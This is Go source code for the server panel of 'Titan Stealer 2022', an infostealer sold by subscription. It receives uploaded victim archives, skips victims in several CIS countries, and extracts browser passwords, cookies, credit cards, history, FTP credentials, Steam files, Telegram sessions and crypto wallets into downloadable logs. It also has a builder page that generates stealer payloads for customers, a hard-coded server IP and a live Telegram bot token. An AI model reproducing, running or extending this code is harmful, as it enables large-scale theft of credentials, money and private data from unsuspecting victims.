package main

import (
	"archive/zip"
	"bytes"
	"database/sql"
	"encoding/base64"
	"fmt"
	"html/template"
	"io"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	"./endpoint"
	"./endpoint/random"

	_ "github.com/go-sql-driver/mysql"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api"

	"github.com/xyproto/unzip"
)

func main() {
	mux := http.NewServeMux()
	go mux.HandleFunc("/", home_page)
	mux.Handle("/assets/", http.StripPrefix("/assets/", http.FileServer(http.Dir("./front/assets"))))
	go mux.HandleFunc("/login/", login_page)
	go mux.HandleFunc("/authed/", authed_page)
	go mux.HandleFunc("/builder/", builder_page)
	go mux.HandleFunc("/logs/", logs_page)
	go mux.HandleFunc("/downloadlog", download_log)
	go mux.HandleFunc("/exportall/", exportall)
	go mux.HandleFunc("/deleteall/", deleteall)
	go mux.HandleFunc("/deletelog", deletelog)
	go mux.HandleFunc("/sendlog", handleConnection)
	go mux.HandleFunc("/convertor/", convertor)
	go mux.HandleFunc("/adduser", adduser)
	if err := http.ListenAndServe("77.73.133.88:5000", mux); err != nil {
		fmt.Println(err)
	}
}

func home_page(w http.ResponseWriter, r *http.Request) {
	if !ifpost(r) {
		http.Redirect(w, r, "/login/", http.StatusSeeOther)
	}
}

func adduser(w http.ResponseWriter, r *http.Request) {
	if !ifpost(r) {
		ip := strings.Split(r.RemoteAddr, ":")[0]
		if ip == "77.73.133.88" {
			login := r.URL.Query().Get("login")
			pwd := r.URL.Query().Get("password")
			t := time.Now()
			month := t.AddDate(0, 1, 0)
			db.Query("INSERT INTO `users` (`login`, `password`, `subtime`) VALUES (?,?,?)", login, pwd, month.Format("2006-01-02"))
		}
	}
}

func convertor(w http.ResponseWriter, r *http.Request) {
	if !ifpost(r) {
		if session, err := store.Get(r, "titan"); err == nil {
			login := session.Values["LOGIN"].(string)
			password := session.Values["PASSWORD"].(string)
			auth, subtime := check_user(login, password)
			if auth {
				if authed, err := template.ParseFiles("front/examples/convertor.html"); err == nil {
					if err := authed.Execute(w, subtime); err != nil {
						fmt.Println(err)
					}
				} else {
					fmt.Println(err)
				}
			}
		}
	}
}

func builder_page(w http.ResponseWriter, r *http.Request) {
	if !ifpost(r) {
		if session, err := store.Get(r, "titan"); err == nil {
			login := session.Values["LOGIN"].(string)
			password := session.Values["PASSWORD"].(string)
			auth, subtime := check_user(login, password)
			if auth {
				if authed, err := template.ParseFiles("front/examples/builder.html"); err == nil {
					if err := authed.Execute(w, subtime); err != nil {
						fmt.Println(err)
					}
				} else {
					fmt.Println(err)
				}
			}
		}
	} else {
		if session, err := store.Get(r, "titan"); err == nil {
			login := session.Values["LOGIN"].(string)
			password := session.Values["PASSWORD"].(string)
			auth, _ := check_user(login, password)
			if auth {
				if err := r.ParseForm(); err == nil {
					builid := r.FormValue("buildid")
					grabext := r.FormValue("grabext")
					domaindetect := r.FormValue("domaindetect")
					browser_wallets := r.FormValue("browser-wallets")
					if browser_wallets == "" {
						browser_wallets = "off"
					}
					desktop_wallets := r.FormValue("desktop_wallets")
					wallet_core := r.FormValue("wallets-core")
					binance := r.FormValue("binance")
					ftp := r.FormValue("ftp")
					steam := r.FormValue("steam")
					telegram := r.FormValue("telegram")
					plugins := r.FormValue("plugins")
					if plugins == "" {
						plugins = "off"
					}
					grabpath := r.FormValue("grabpath")
					if grabpath == "" {
						grabpath = "off"
					}
					server := r.FormValue("server")
					if server == "" {
						server = "off"
					}
					file, err := Build(login, builid, grabext, domaindetect, browser_wallets, desktop_wallets, wallet_core, binance, ftp, steam, telegram, plugins, grabpath, server)
					if err == 0 {
						w.Header().Set("Content-Disposition", "attachment;filename="+login+".zip")
						w.WriteHeader(http.StatusOK)
						w.Write(file)
					}
				}
			}
		}
	}
}

func logs_page(w http.ResponseWriter, r *http.Request) {
	if session, err := store.Get(r, "titan"); err == nil {
		login := session.Values["LOGIN"].(string)
		password := session.Values["PASSWORD"].(string)
		auth, subtime := check_user(login, password)
		if auth {
			logsforpage := LogsForPage{}
			wallets := 0
			steams := 0
			passwords := 0
			logscount := 0
			if authed, err := template.ParseFiles("front/examples/logs.html"); err == nil {
				if rows, err := db.Query("SELECT * FROM logs WHERE UserId = ?", login); err == nil {
					logs := []ELogs{}
					for rows.Next() {
						val := ELogs{}
						if err := rows.Scan(&val.LogName, &val.PassCount, &val.CookiesCount, &val.UserId,
							&val.Tag, &val.DateTime, &val.Wallets, &val.Telegram, &val.Steam); err == nil {
							if ff, err := os.Stat("logs/" + login + "/" + val.LogName); err == nil {
								val.LogSize = float64(ff.Size()) * 0.001
							}
							logs = append(logs, val)
						}
					}

					for _, l := range logs {
						if l.Wallets == "Yes" {
							wallets++
						}
						if l.Steam == "Yes" {
							steams++
						}
						passwords += l.PassCount
					}
					logscount = len(logs)
					logsforpage = LogsForPage{subtime, logs, logscount, passwords, steams, wallets}
				} else {
					fmt.Println(err)
				}

				if err := authed.Execute(w, logsforpage); err != nil {
					fmt.Println(err)
				}
			} else {
				fmt.Println(err)
			}
		}
	}
}

func download_log(w http.ResponseWriter, r *http.Request) {
	if session, err := store.Get(r, "titan"); err == nil {
		login := session.Values["LOGIN"].(string)
		password := session.Values["PASSWORD"].(string)
		if auth, _ := check_user(login, password); auth {
			name := r.URL.Query().Get("logname")
			r := []string{"\\", "/"}
			for _, s := range r {
				if strings.Contains(name, s) {
					return
				}
			}
			file, err := os.ReadFile("logs/" + login + "/" + name)
			if err == nil {
				w.Header().Set("Content-Disposition", "attachment;filename="+name)
				w.WriteHeader(http.StatusOK)
				w.Write(file)
			}
		}

	}
}

func deletelog(w http.ResponseWriter, r *http.Request) {
	if session, err := store.Get(r, "titan"); err == nil {
		login := session.Values["LOGIN"].(string)
		password := session.Values["PASSWORD"].(string)
		if auth, _ := check_user(login, password); auth {
			name := r.URL.Query().Get("logname")
			r := []string{"\\", "/"}
			for _, s := range r {
				if strings.Contains(name, s) {
					return
				}
			}
			db.Query("delete from logs where UserId = ? AND LogName = ?", login, name)
			os.RemoveAll("logs/" + login + "/" + name)
		}
	}
}

func deleteall(w http.ResponseWriter, r *http.Request) {
	if session, err := store.Get(r, "titan"); err == nil {
		login := session.Values["LOGIN"].(string)
		password := session.Values["PASSWORD"].(string)
		if auth, _ := check_user(login, password); auth {
			db.Query("delete from logs where UserId = ?", login)
			os.RemoveAll("logs/" + login)
		}
	}
}

func exportall(w http.ResponseWriter, r *http.Request) {
	if session, err := store.Get(r, "titan"); err == nil {
		login := session.Values["LOGIN"].(string)
		password := session.Values["PASSWORD"].(string)
		if auth, _ := check_user(login, password); auth {
			if files, err := os.ReadDir("logs/" + login); err == nil {
				buf := new(bytes.Buffer)
				writer := zip.NewWriter(buf)
				writer.SetComment("Titan Stealer 2022")
				for _, f := range files {
					if ff, err := os.ReadFile("logs/" + login + "/" + f.Name()); err == nil {
						if fw, err := writer.Create(f.Name()); err == nil {
							fw.Write(ff)
						}
					}
				}
				writer.Close()
				w.Header().Set("Content-Disposition", "attachment;filename="+login+".zip")
				w.WriteHeader(http.StatusOK)
				w.Write(buf.Bytes())
			}
		}
	}
}

func login_page(w http.ResponseWriter, r *http.Request) {
	if !ifpost(r) {
		login_page_render(w)
	} else {
		if err := r.ParseForm(); err == nil {
			login := r.FormValue("login")
			password := r.FormValue("pass")
			auth, _ := check_user(login, password)
			if auth {
				if session, err := store.Get(r, "titan"); err == nil {
					session.Values["LOGIN"] = login
					session.Values["PASSWORD"] = password
					session.Save(r, w)
					http.Redirect(w, r, "/authed/", http.StatusSeeOther)
				} else {
					fmt.Println("Login page1", err)
					error_page_render(w)
				}
			} else {
				fmt.Println("Login Page2", err)
				error_page_render(w)
			}
		}
	}
}

func authed_page(w http.ResponseWriter, r *http.Request) {
	if session, err := store.Get(r, "titan"); err == nil {
		login := session.Values["LOGIN"].(string)
		password := session.Values["PASSWORD"].(string)
		auth, subtime := check_user(login, password)
		if auth {
			logs := []Logs{}
			if rows, err := db.Query("SELECT * FROM logs WHERE UserId = ? AND DateTime >= NOW() - INTERVAL 150 DAY", login); err == nil {
				for rows.Next() {
					val := Logs{}
					if err := rows.Scan(&val.LogName, &val.PassCount, &val.CookiesCount, &val.UserId,
						&val.Tag, &val.DateTime, &val.Wallets, &val.Telegram, &val.Steam); err == nil {
						logs = append(logs, val)
					}
				}
				allcokies := 0
				allcountryes := []string{}
				wallets := 0
				usa := 0
				ger := 0
				aus := 0
				uk := 0
				ro := 0
				br := 0
				t := time.Now()
				_, minmonth, _ := t.AddDate(0, -4, 0).Date()
				_, min1month, _ := t.AddDate(0, -3, 0).Date()
				_, min2month, _ := t.AddDate(0, -2, 0).Date()
				_, min3month, _ := t.AddDate(0, -1, 0).Date()
				_, min4month, _ := t.AddDate(0, 0, 0).Date()
				month_for_wallet1 := 0
				month_for_wallet2 := 0
				month_for_wallet3 := 0
				month_for_wallet4 := 0
				month_for_wallet5 := 0

				month_for_cookie1 := 0
				month_for_cookie2 := 0
				month_for_cookie3 := 0
				month_for_cookie4 := 0
				month_for_cookie5 := 0

				for _, l := range logs {
					sss := l.LogName
					dsd := []string{"1", "2", "3", "4", "5", "6", "7", "8", "9", "0", ".", "zip"}
					for _, d := range dsd {
						sss = strings.Replace(sss, d, "", -1)
					}
					allcountryes = append(allcountryes, sss)
					cookie, err := strconv.Atoi(l.CookiesCount)
					if err == nil {
						allcokies += cookie
					}
					if l.Wallets == "Yes" {
						wallets++
					}
					if check, err := time.Parse("2006-01-02", l.DateTime); err == nil {
						if check.Month() == minmonth {
							month_for_wallet1++
							if cookie > 0 {
								month_for_cookie1++
							}
						} else if check.Month() == min1month {
							month_for_wallet2++
							if cookie > 0 {
								month_for_cookie2++
							}
						} else if check.Month() == min2month {
							month_for_wallet3++
							if cookie > 0 {
								month_for_cookie3++
							}
						} else if check.Month() == min3month {
							month_for_wallet4++
							if cookie > 0 {
								month_for_cookie4++
							}
						} else if check.Month() == min4month {
							month_for_wallet5++
							if cookie > 0 {
								month_for_cookie5++
							}
						}
					}
				}

				for _, geo := range allcountryes {
					if geo == "US" {
						usa++
					} else if geo == "DE" {
						ger++
					} else if geo == "AU" {
						aus++
					} else if geo == "UK" {
						uk++
					} else if geo == "RO" {
						ro++
					} else if geo == "BR" {
						br++
					}
				}
				countrycount := usa + ger + aus + uk + ro + br
				day12ago := 0
				day11ago := 0
				day10ago := 0
				day9ago := 0
				day8ago := 0
				day7ago := 0
				day6ago := 0
				day5ago := 0
				day4ago := 0
				day3ago := 0
				day2ago := 0
				day1ago := 0
				_, _, now12day := t.AddDate(0, 0, -11).Date()
				_, _, now11day := t.AddDate(0, 0, -10).Date()
				_, _, now10day := t.AddDate(0, 0, -9).Date()
				_, _, now9day := t.AddDate(0, 0, -8).Date()
				_, _, now8day := t.AddDate(0, 0, -7).Date()
				_, _, now7day := t.AddDate(0, 0, -6).Date()
				_, _, now6day := t.AddDate(0, 0, -5).Date()
				_, _, now5day := t.AddDate(0, 0, -4).Date()
				_, _, now4day := t.AddDate(0, 0, -3).Date()
				_, _, now3day := t.AddDate(0, 0, -2).Date()
				_, _, now2day := t.AddDate(0, 0, -1).Date()
				_, _, now1day := t.AddDate(0, 0, 0).Date()
				now12days := t.AddDate(0, 0, -11).Format("Jan-02")
				now11days := t.AddDate(0, 0, -10).Format("Jan-02")
				now10days := t.AddDate(0, 0, -9).Format("Jan-02")
				now9days := t.AddDate(0, 0, -8).Format("Jan-02")
				now8days := t.AddDate(0, 0, -7).Format("Jan-02")
				now7days := t.AddDate(0, 0, -6).Format("Jan-02")
				now6days := t.AddDate(0, 0, -5).Format("Jan-02")
				now5days := t.AddDate(0, 0, -4).Format("Jan-02")
				now4days := t.AddDate(0, 0, -3).Format("Jan-02")
				now3days := t.AddDate(0, 0, -2).Format("Jan-02")
				now2days := t.AddDate(0, 0, -1).Format("Jan-02")
				now1days := t.AddDate(0, 0, 0).Format("Jan-02")
				alllogs7day := []Logs{}
				if rows, err = db.Query("SELECT * FROM logs WHERE UserId = ? AND DateTime >= NOW() - INTERVAL 12 DAY", login); err == nil {
					for rows.Next() {
						val := Logs{}
						if err := rows.Scan(&val.LogName, &val.PassCount, &val.CookiesCount, &val.UserId,
							&val.Tag, &val.DateTime, &val.Wallets, &val.Telegram, &val.Steam); err == nil {
							alllogs7day = append(alllogs7day, val)
						}
					}

					for _, l := range alllogs7day {
						if check, err := time.Parse("2006-01-02", l.DateTime); err == nil {
							if check.Day() == now7day {
								day7ago++
							} else if check.Day() == now6day {
								day6ago++
							} else if check.Day() == now5day {
								day5ago++
							} else if check.Day() == now4day {
								day4ago++
							} else if check.Day() == now3day {
								day3ago++
							} else if check.Day() == now2day {
								day2ago++
							} else if check.Day() == now1day {
								day1ago++
							} else if check.Day() == now8day {
								day8ago++
							} else if check.Day() == now9day {
								day9ago++
							} else if check.Day() == now10day {
								day10ago++
							} else if check.Day() == now11day {
								day11ago++
							} else if check.Day() == now12day {
								day12ago++
							}
						}
					}
				}
				now14days := t.AddDate(0, 0, -14).Format("Jan-02")
				now21days := t.AddDate(0, 0, -21).Format("Jan-02")
				now28days := t.AddDate(0, 0, -28).Format("Jan-02")
				now7wwday := t.AddDate(0, 0, -7)
				now14day := t.AddDate(0, 0, -14)
				now21day := t.AddDate(0, 0, -21)
				now28day := t.AddDate(0, 0, -28)
				day7wago := 0
				day14ago := 0
				day21ago := 0
				day28ago := 0
				alllogs30day := []Logs{}
				if rows, err = db.Query("SELECT * FROM logs WHERE UserId = ? AND DateTime >= NOW() - INTERVAL 30 DAY", login); err == nil {
					for rows.Next() {
						val := Logs{}
						if err := rows.Scan(&val.LogName, &val.PassCount, &val.CookiesCount, &val.UserId,
							&val.Tag, &val.DateTime, &val.Wallets, &val.Telegram, &val.Steam); err == nil {
							alllogs30day = append(alllogs30day, val)
						}
					}

					for _, l := range alllogs30day {
						if check, err := time.Parse("2006-01-02", l.DateTime); err == nil {
							if check.Before(now28day) || check == now28day {
								day28ago++
							} else if check.Before(now21day) || check == now21day {
								day21ago++
							} else if check.Before(now14day) || check == now14day {
								day14ago++
							} else if check.Before(now7wwday) || check == now7wwday {
								day7wago++
							}
						}
					}
				}

				dashboard := Dashboard{usa, ger, aus, uk, ro, br, countrycount,
					subtime, wallets, allcokies, strings.ToUpper(minmonth.String()[:3]),
					strings.ToUpper(min1month.String()[:3]), strings.ToUpper(min2month.String()[:3]),
					strings.ToUpper(min3month.String()[:3]), strings.ToUpper(min4month.String()[:3]),
					month_for_wallet1, month_for_wallet2, month_for_wallet3, month_for_wallet4, month_for_wallet5,
					month_for_cookie1, month_for_cookie2, month_for_cookie3, month_for_cookie4, month_for_cookie5, now12days, now11days, now10days, now9days,
					now8days, now7days, now6days, now5days, now4days, now3days, now2days, now1days, day12ago, day11ago, day10ago,
					day9ago, day8ago, day7ago, day6ago, day5ago, day4ago, day3ago, day2ago, day1ago, now28days, now21days, now14days,
					now7days, day28ago, day21ago, day14ago, day7wago}

				if authed, err := template.ParseFiles("front/examples/dashboard.html"); err == nil {
					if err := authed.Execute(w, dashboard); err != nil {
						fmt.Println(err)
					}
				} else {
					fmt.Println(err)
				}
			}
		} else {
			error_page_render(w)
			fmt.Println("Dashboard page1", err)
		}
	} else {
		fmt.Println("Dashboard page2", err)
		error_page_render(w)
	}
}

func handleConnection(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		name := r.RemoteAddr
		name, _, _ = strings.Cut(name, ":")
		user := r.Header.Get("Userid")
		isprokladka := r.Header.Get("Prokladka")
		if isprokladka != "" {
			name = r.Header.Get("IP")
		}
		if SQLi_Guard(user) {
			db, err := sql.Open("mysql", "root:@/fuck")
			if err == nil {
				defer db.Close()
				rows, err := db.Query("SELECT value FROM getlog WHERE value = ? AND userid = ?", name, user)
				geterr(err)
				if err == nil {
					defer rows.Close()
					for rows.Next() {
						var value string
						rows.Scan(&value)
						if value != "" {
							return
						}
					}
					_, err := db.Query("INSERT INTO `getlog` (`value`, `userid`) VALUES (?, ?)", name, user)
					geterr(err)
					country, err := http.Get("http://ip-api.com/line/" + name)
					if err == nil {
						country1, err := io.ReadAll(country.Body)
						if err == nil {
							country2 := strings.Split(string(country1), "\n")
							if country2[2] != "RU" && country2[2] != "UA" && country2[2] != "KZ" && country2[2] != "BY" && country2[2] != "KG" {
								if country2[0] == "fail" {
									country2[2] = "None"
								}
								r.Body = http.MaxBytesReader(w, r.Body, 104857600)
								b64 := r.FormValue("B64")
								city := country2[5]
								byt, err := base64.URLEncoding.DecodeString(b64)
								if err == nil {
									os.Mkdir(name, 0777)
									file, err := os.Create(name + "/" + name + ".zip")
									if err == nil {
										file.Write(byt)
										file.Close()
										go handleConnection2(name, country2[2], city)
									}
								}
							}
						}
					}
				}
			}
		}
	}
}

func handleConnection2(name, country, city string) {
	db, err := sql.Open("mysql", "root:@/fuck")
	if err == nil {
		defer db.Close()
		buf := new(bytes.Buffer)
		writer := zip.NewWriter(buf)
		writer.SetComment("Titan Stealer 2022")
		unzip.Extract(name+"/"+name+".zip", name+"/")
		files, err := os.ReadDir(name + "/")
		cookielist := []string{}
		passlist := []string{}
		autolist := []string{}
		cclist := []string{}
		histlist := []string{}
		booklist := []string{}
		wallets := "No"
		telegram := "No"
		steam := "No"
		copyright := "© TITAN Stealer Production 2022\n\n"
		if err == nil {
			for _, file := range files {
				if file.Name() == "Chromium" {
					files1, err := os.ReadDir(name + "/Chromium")
					if err == nil {
						for _, file1 := range files1 {
							if file1.IsDir() {
								files2, err := os.ReadDir(name + "/Chromium/" + file1.Name())
								if err == nil {
									for _, file2 := range files2 {
										if strings.HasPrefix(file2.Name(), "Local State") {
											mast, err := os.ReadFile(name + "/Chromium/" + file1.Name() + "/" + file2.Name())
											if err == nil {
												if string(mast) != "" {
													for _, file2 := range files2 {
														if strings.Contains(file2.Name(), "Cookie") {
															cookies := endpoint.ChromiumCookie(name+"/Chromium/"+file1.Name()+"/"+file2.Name(), mast)
															if len(cookies) > 0 {
																for _, cook := range cookies {
																	if len(cook.Cookies) > 1 {
																		writer.Create("Cookies/")
																		cookf, err := writer.Create("Cookies/" + file1.Name() + "_" + cook.Profilename + ".txt")
																		if err == nil {
																			for _, cookd := range cook.Cookies {
																				cookielist = append(cookielist, cookd)
																				cookf.Write([]byte(cookd))
																			}
																		}
																	}
																}
															}
														} else if strings.Contains(file2.Name(), "Pass") {
															pass := endpoint.ChromiumPasswords(name+"/Chromium/"+file1.Name()+"/"+file2.Name(), mast)
															if len(pass) > 0 {
																passlist = append(passlist, pass...)
															}

														} else if strings.Contains(file2.Name(), "Autofill") {
															autofill, ccc := endpoint.ChromiumAutofill(name+"/Chromium/"+file1.Name()+"/"+file2.Name(), mast)
															if len(autofill) > 0 {
																autolist = append(autolist, autofill...)
															}
															if len(ccc) > 0 {
																cclist = append(cclist, ccc...)
															}
														}
													}
												}
											}
										} else if strings.Contains(file2.Name(), "History") {
											hist := endpoint.ChromiumHistory(name + "/Chromium/" + file1.Name() + "/" + file2.Name())
											if len(hist) > 0 {
												histlist = append(histlist, hist...)
											}
										}
									}
								}
							}
						}
					}
				} else if file.Name() == "FTP" {
					if filezilla, err := os.ReadFile(name + "/FTP/FZ/recentservers.xml"); err == nil {
						writer.Create("FTP/")
						writer.Create("FTP/FileZilla/")
						if f, err := writer.Create("FTP/FileZilla/recentservers.xml"); err == nil {
							f.Write(filezilla)
						}
					}
					if totalcommander, err := os.ReadFile(name + "/FTP/TM/wcx_ftp.ini"); err == nil {
						writer.Create("FTP/")
						writer.Create("FTP/TotamCommander/")
						if f, err := writer.Create("FTP/TotalCommander/wcx_ftp.ini"); err == nil {
							f.Write(totalcommander)
						}
					}

				} else if file.Name() == "Screenshot.jpeg" {
					screenshot, err := os.ReadFile(name + "/Screenshot.jpeg")
					if err == nil {
						screenf, err := writer.Create("Screenshot.jpeg")
						if err == nil {
							screenf.Write(screenshot)
						}
					}
				} else if file.Name() == "InstalledSoftware.txt" {
					inst, err := os.ReadFile(name + "/InstalledSoftware.txt")
					if err == nil {
						instf, err := writer.Create("InstalledSoftware.txt")
						if err == nil {
							instf.Write([]byte(copyright))
							instf.Write(inst)
						}
					}
				} else if strings.HasPrefix(file.Name(), "ssfn") {
					ssfne, err := os.ReadFile(name + "/" + file.Name())
					if err == nil {
						steam = "Yes"
						writer.Create("Steam/")
						ssfnf, err := writer.Create("Steam/" + file.Name())
						if err == nil {
							ssfnf.Write(ssfne)
						}
					}
				} else if file.Name() == "loginusers.vdf" {
					log, err := os.ReadFile(name + "/loginusers.vdf")
					if err == nil {
						steam = "Yes"
						writer.Create("Steam/")
						logf, err := writer.Create("Steam/loginusers.vdf")
						if err == nil {
							logf.Write(log)
						}
					}
				} else if file.Name() == "config.vdf" {
					cfg, err := os.ReadFile(name + "/config.vdf")
					if err == nil {
						steam = "Yes"
						writer.Create("Steam/")
						cfgf, err := writer.Create("Steam/config.vdf")
						if err == nil {
							cfgf.Write(cfg)
						}
					}
				} else if file.Name() == "tdata" {
					files, err := os.ReadDir(name + "/tdata")
					if err == nil {
						if len(files) > 0 {
							telegram = "Yes"
							writer.Create("tdata/")
							for _, file := range files {
								if !file.IsDir() {
									filee, err := os.ReadFile(name + "/tdata/" + file.Name())
									if err == nil {
										filef, err := writer.Create("tdata/" + file.Name())
										if err == nil {
											filef.Write(filee)
										}
									}
								} else {
									files1, err := os.ReadDir(name + "/tdata/" + file.Name())
									if err == nil {
										if len(files1) > 0 {
											writer.Create("tdata/")
											writer.Create("tdata/" + file.Name() + "/")
											for _, file1 := range files1 {
												filee1, err := os.ReadFile(name + "/tdata/" + file.Name() + "/" + file1.Name())
												if err == nil {
													filef1, err := writer.Create("tdata/" + file.Name() + "/" + file1.Name())
													if err == nil {
														filef1.Write(filee1)
													}
												}
											}
										}
									}
								}
							}
						}
					}
				} else if file.Name() == "Wallets" {
					dirs, err := os.ReadDir(name + "/Wallets")
					if err == nil {
						if len(dirs) > 0 {
							writer.Create("Wallets/")
							for _, files := range dirs {
								if !files.IsDir() {
									wallets = "Yes"
									filee, err := os.ReadFile(name + "/Wallets/" + files.Name())
									if err == nil {
										filef, err := writer.Create("Wallets/" + files.Name())
										if err == nil {
											filef.Write(filee)
										}
									}
								} else {
									if files.Name() != "logs" {
										wallets = "Yes"
									}
									filesw, err := os.ReadDir(name + "/Wallets/" + files.Name())
									if err == nil {
										if len(filesw) > 0 {
											writer.Create("Wallets/")
											writer.Create("Wallets/" + files.Name() + "/")
											for _, filess := range filesw {
												filee, err := os.ReadFile(name + "/Wallets/" + files.Name() + "/" + filess.Name())
												if err == nil {
													filef, err := writer.Create("Wallets/" + files.Name() + "/" + filess.Name())
													if err == nil {
														filef.Write(filee)
													}
												}
											}
										}
									}
								}
							}
						}
					}
				} else if file.Name() == "FileGrabber" {
					files, err := os.ReadDir(name + "/FileGrabber")
					if err == nil {
						if len(files) > 0 {
							writer.Create("FileGrabber/")
							for _, file1 := range files {
								filee, err := os.ReadFile(name + "/FileGrabber/" + file1.Name())
								if err == nil {
									filef, err := writer.Create("FileGrabber/" + file1.Name())
									if err == nil {
										filef.Write(filee)
									}
								}
							}
						}
					}
				} else if file.Name() == "Usinfo.txt" {
					usinfo, err := os.ReadFile(name + "/Usinfo.txt")
					if err == nil {
						usinfof, err := writer.Create("Info.txt")
						if err == nil {
							usinfof.Write([]byte(copyright))
							usinfof.Write([]byte("IP: " + name + "\nCountry: " + country + "\nCity: " + city + "\n"))
							usinfof.Write(usinfo)
						}
					}
				} else if file.Name() == "Gecko" {
					folder, err := os.ReadDir(name + "/Gecko")
					if err == nil {
						for _, fild := range folder {
							if fild.IsDir() {
								folder1, err := os.ReadDir(name + "/Gecko/" + fild.Name())
								if err == nil {
									for _, fild1 := range folder1 {
										if strings.Contains(fild1.Name(), "Cookie") {
											cookies := endpoint.GeckoCookie(name + "/Gecko/" + fild.Name() + "/" + fild1.Name())
											if len(cookies) > 0 {
												writer.Create("Cookies/")
												cookf, err := writer.Create("Cookies/" + fild.Name() + "_" + random.Random() + ".txt")
												if err == nil {
													for _, c := range cookies {
														cookielist = append(cookielist, c)
														cookf.Write([]byte(c))
													}
												}
											}
										} else if strings.Contains(fild1.Name(), "History") {
											history, bookmarks := endpoint.GeckoHistory(name + "/Gecko/" + fild.Name() + "/" + fild1.Name())
											if len(history) > 0 {
												histlist = append(histlist, history...)
											}
											if len(bookmarks) > 0 {
												booklist = append(booklist, bookmarks...)
											}
										} else if strings.Contains(fild1.Name(), "Autofill") {
											autofill := endpoint.GeckoAutofill(name + "/Gecko/" + fild.Name() + "/" + fild1.Name())
											if len(autofill) > 0 {
												autolist = append(autolist, autofill...)
											}
										}
									}
								}
							}
						}
					}
				}
			}

			var user string
			var tag string
			if !SQLi_Guard(tag) {
				tag = "injection"
			}
			info, err := os.ReadFile(name + "/Info.txt")
			if err == nil {
				vars := strings.Split(string(info), "\n")
				if len(vars) > 1 {
					user = vars[0]
					tag = vars[1]
				}
			}
			os.Mkdir("logs/"+user, 0777)
			if len(passlist) > 0 {
				passf, err := writer.Create("Passwords.txt")
				if err == nil {
					passf.Write([]byte(copyright))
					slice := []string{}
					for _, p := range passlist {
						check, _ := endpoint.SliceCheck(p, slice)
						if !check {
							slice = append(slice, p)
							passf.Write([]byte(p))
						}
					}
				}
			}

			if len(autolist) > 0 {
				autof, err := writer.Create("Autofill.txt")
				if err == nil {
					autof.Write([]byte(copyright))
					slice := []string{}
					for _, a := range autolist {
						check, _ := endpoint.SliceCheck(a, slice)
						if !check {
							slice = append(slice, a)
							autof.Write([]byte(a))
						}
					}
				}
			}
			if len(cclist) > 0 {
				ccf, err := writer.Create("CC.txt")
				if err == nil {
					ccf.Write([]byte(copyright))
					slice := []string{}
					for _, cc := range cclist {
						check, _ := endpoint.SliceCheck(cc, slice)
						if !check {
							slice = append(slice, cc)
							ccf.Write([]byte(cc))
						}
					}
				}
			}
			if len(histlist) > 0 {
				histf, err := writer.Create("History.txt")
				if err == nil {
					histf.Write([]byte(copyright))
					slice := []string{}
					for _, h := range histlist {
						check, _ := endpoint.SliceCheck(h, slice)
						if !check {
							slice = append(slice, h)
							histf.Write([]byte(h))
						}
					}
				}
			}
			if len(booklist) > 0 {
				histf, err := writer.Create("Bookmarks.txt")
				if err == nil {
					histf.Write([]byte(copyright))
					slice := []string{}
					for _, h := range booklist {
						check, _ := endpoint.SliceCheck(h, slice)
						if !check {
							slice = append(slice, h)
							histf.Write([]byte(h))
						}
					}
				}
			}
			writer.Close()

			log, err := os.Create("logs/" + user + "/" + name + "." + country + ".zip")
			if err == nil {
				defer log.Close()
				log.Write(buf.Bytes())
				db.Exec("INSERT INTO `logs` (`LogName`, `PassCount`, `CookiesCount`, `UserId`, `Tag`, `Wallets`, `Telegram`, `Steam`) VALUES ('" + name + "." + country + ".zip', '" + fmt.Sprint(len(passlist)) + "', '" + fmt.Sprint(len(cookielist)) + "','" + user + "','" + tag + "','" + wallets + "','" + telegram + "','" + steam + "')")
			}
			aaa := tg{}
			if telegramid, err := db.Query("SELECT * FROM telegram WHERE username = ?", user); err == nil {
				defer telegramid.Close()
				for telegramid.Next() {
					telegramid.Scan(&aaa.username, &aaa.telegram_id)
				}

			}
			if aaa.telegram_id != "" && aaa.username != "" {
				sendmessage(aaa.telegram_id)
			}
		}
		os.RemoveAll(name)
	}
}

func sendmessage(userid string) {
	if bot, err := tgbotapi.NewBotAPI("5568045833:AAHatXMnFsm870F2zhi6a76CjwrbzArvYmo"); err == nil {
		if chatid, err := strconv.Atoi(userid); err == nil {
			msg := tgbotapi.NewMessage(int64(chatid), "New Log!")
			if _, err := bot.Send(msg); err != nil {
				fmt.Println(err)
			}
		} else {
			fmt.Println(err)
		}
	} else {
		fmt.Println(err)
	}
}

type tg struct {
	telegram_id string
	username    string
}

func geterr(err error) {
	if err != nil {
		fmt.Println(err)
	}
}
